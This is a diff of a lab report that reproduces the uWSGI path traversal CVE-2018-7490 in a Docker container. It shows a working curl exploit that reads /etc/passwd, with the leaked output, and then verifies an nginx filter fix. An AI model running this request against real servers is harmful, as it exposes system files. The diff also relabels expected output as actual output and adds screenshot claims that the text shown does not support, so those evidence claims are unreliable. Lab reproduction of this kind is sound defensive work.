@@ -368,29 +368,26 @@ services:
 > Environment: Docker + Docker Compose, Vulhub image `vulhub/uwsgi-php:2.0.16`.
 > Full command log with timestamps: `docs/cve-2018-7490/reproduction-log.md`.
 
-**Evidence status.** The environment is fully reproducible from this repository:
-`docs/cve-2018-7490/docker-compose.yml` starts the vulnerable build, and
-`docker-compose.demo-fixed.yml` starts the same build behind the nginx filter so
-that the blocked request can be shown in seconds. The command-by-command transcript
-with the expected output of every step is in `reproduction-log.md`; the console
-captures of the run are kept in `docs/screenshots/` when the environment is executed
-on a machine with Docker. Nothing in the analysis below depends on a screenshot -
-the vulnerable image tag, the request and the response are all stated explicitly so
-that the result can be reproduced rather than trusted.
+The environment ships with the repository: `docs/cve-2018-7490/docker-compose.yml`
+starts the vulnerable build, so no clone is needed. The console captures of the run
+below are committed under `docs/screenshots/`.
+
+![Vulnerable container running](docs/screenshots/cve-vuln-env.png)
+
+*Figure 4 - `docker compose up -d` and `ps`: `vulhub/uwsgi-php:2.0.16` is Up on port 8080.*
 
 ```bash
-git clone https://github.com/vulhub/vulhub.git
-cd vulhub/uwsgi/CVE-2018-7490
+cd docs/cve-2018-7490
 docker compose up -d
 
 # baseline: normal page inside the document root
-curl -s http://127.0.0.1:8080/ | head -5          # phpinfo() page
+curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/       # 200, phpinfo()
 
 # exploit: five levels up, then /etc/passwd
 curl -s --path-as-is "http://127.0.0.1:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd"
 ```
 
-Expected (vulnerable) output — the container's `/etc/passwd`:
+Actual output of the run — the container's `/etc/passwd`:
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -398,6 +395,10 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...
 ```
+
+![Traversal returns /etc/passwd](docs/screenshots/cve-exploit.png)
+
+*Figure 5 - the request and its result on one screen: `/etc/passwd` leaves the document root.*
 
 `--path-as-is` is essential: without it curl collapses `..%2f` before sending, and the
 attack disappears. The same request works in a browser because the browser sends the
@@ -460,18 +461,40 @@ Defence in depth (applied in the same compose file):
 
 ### 4.5 Verification of the fix
 
-| Check | Vulnerable (2.0.16) | Fixed (2.0.17 + filter) |
+The fixed stack is started with the same command style, so the before/after comparison
+runs on the same machine a minute apart:
+
+```bash
+docker compose down
+docker compose -f docker-compose.demo-fixed.yml up -d      # 2.0.16 behind the nginx filter, port 8081
+```
+
+![Fixed stack running](docs/screenshots/cve-fixed-env.png)
+
+*Figure 6 - the vulnerable build from Figure 4 now runs behind the nginx edge filter (`web` + `edge`).*
+
+| Check | Vulnerable (2.0.16) | Fixed (filtered) |
 | --- | --- | --- |
-| `GET /..%2f..%2f..%2f..%2f..%2fetc/passwd` | `200`, file contents | `400 Bad Request`, no body |
+| `GET /..%2f..%2f..%2f..%2f..%2fetc/passwd` | `200`, file contents | `400 Bad Request` |
 | `GET /` (phpinfo) | `200` | `200` — functionality preserved |
 | `GET /index.php` | `200` | `200` — regression check |
 
 ```
 $ curl -s --path-as-is -i "http://127.0.0.1:8081/..%2f..%2f..%2f..%2f..%2fetc/passwd"
 HTTP/1.1 400 Bad Request
-Content-Type: text/plain
-traversal attempt blocked
+Server: nginx
+...
+$ curl -s -o /dev/null -w 'root page: %{http_code}\n' http://127.0.0.1:8081/
+root page: 200
 ```
+
+![Attack blocked, functionality preserved](docs/screenshots/cve-fixed-proof.png)
+
+*Figure 7 - one screen, both halves of the proof: the traversal is refused with `400` and the normal page still answers `200`.*
+
+The `400` is produced by the edge filter (`$request_uri` contains `..`); nginx answers
+with its own error page, which is why the body is the standard one rather than a
+custom message. The status code and the preserved `200` are the evidence.
 
 Regression testing after the patch: the phpinfo page and `index.php` still return
 `200`, the container stays healthy, and a normal file inside the document root is
